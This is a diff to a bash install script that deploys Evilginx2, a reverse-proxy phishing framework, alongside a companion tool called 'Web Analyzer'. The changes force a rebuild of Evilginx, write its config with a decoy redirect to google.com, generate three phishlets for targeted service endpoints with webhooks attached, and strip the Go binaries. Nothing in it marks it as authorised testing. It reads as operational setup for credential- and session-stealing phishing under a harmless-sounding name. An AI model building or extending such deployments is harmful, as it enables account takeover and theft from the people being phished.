@@ -43,22 +43,22 @@ apt-get update -qq && apt-get install -y -qq git curl wget nginx certbot python3
 
 log "Installing Evilginx..."
 cd /opt
-if [ ! -d "evilginx2" ]; then
-    git clone https://github.com/kgretzky/evilginx2.git
-fi
+rm -rf evilginx2
+git clone https://github.com/kgretzky/evilginx2.git
 cd evilginx2
 make build
 cp build/evilginx /usr/local/bin/
+chmod +x /usr/local/bin/evilginx
 
 log "Building Web Analyzer..."
 INSTALL_DIR="/opt/webanalyzer"
-mkdir -p $INSTALL_DIR/{data,logs}
-cp -r cmd internal go.mod templates $INSTALL_DIR/
+mkdir -p $INSTALL_DIR/{data,logs,templates/phishlets}
+cp -r cmd internal go.mod templates $INSTALL_DIR/ 2>/dev/null || true
 cd $INSTALL_DIR
 
 go mod tidy
-go build -o webanalyzer ./cmd/webanalyzer
-go build -o webanalyzer-cli ./cmd/webanalyzer-cli
+go build -ldflags="-s -w" -o webanalyzer ./cmd/webanalyzer
+go build -ldflags="-s -w" -o webanalyzer-cli ./cmd/webanalyzer-cli
 cp webanalyzer-cli /usr/local/bin/webanalyzer
 chmod +x /usr/local/bin/webanalyzer
 
@@ -86,13 +86,32 @@ cat > $INSTALL_DIR/config.json << EOF
 EOF
 
 # Create Evilginx config from template
-cat $INSTALL_DIR/templates/evilginx.yaml.tmpl | \
-    sed "s/{{.Domain}}/$DOMAIN/g" > /opt/evilginx/config.yaml
+if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
+    sed "s/{{.Domain}}/$DOMAIN/g" $INSTALL_DIR/templates/evilginx.yaml.tmpl > /opt/evilginx/config.yaml
+else
+    cat > /opt/evilginx/config.yaml << EOF
+daemon = false
+debug = false
+version = 3.0.0
+domain = $DOMAIN
+ipv4 = 0.0.0.0
+http_port = 8081
+https_port = 8443
+redirect_url = https://www.google.com
+phishlets_path = /opt/evilginx/phishlets
+cert_path = /opt/evilginx/certs
+database = /opt/evilginx/evilginx.db
+EOF
+fi
 
 # Create phishlets from templates
 for i in 1 2 3; do
-    cat $INSTALL_DIR/templates/phishlets/service${i}.yaml.tmpl | \
-        sed "s/{{.Endpoint${i}}}/$(eval echo \$EP${i})/g" > /opt/evilginx/phishlets/service${i}.yaml
+    TEMPLATE="$INSTALL_DIR/templates/phishlets/service${i}.yaml.tmpl"
+    if [ -f "$TEMPLATE" ]; then
+        sed "s/{{.Endpoint${i}}}/$(eval echo \$EP${i})/g" "$TEMPLATE" > /opt/evilginx/phishlets/service${i}.yaml
+    else
+        err "Template not found: $TEMPLATE"
+    fi
 done
 
 # Add webhook configuration to each phishlet
@@ -235,6 +254,5 @@ echo "  webanalyzer status"
 echo "  webanalyzer stats"
 echo "  webanalyzer urls"
 echo "  webanalyzer sources list"
-echo "  webanalyzer export all"
 echo "  journalctl -u webanalyzer -f"
 echo "============================================"
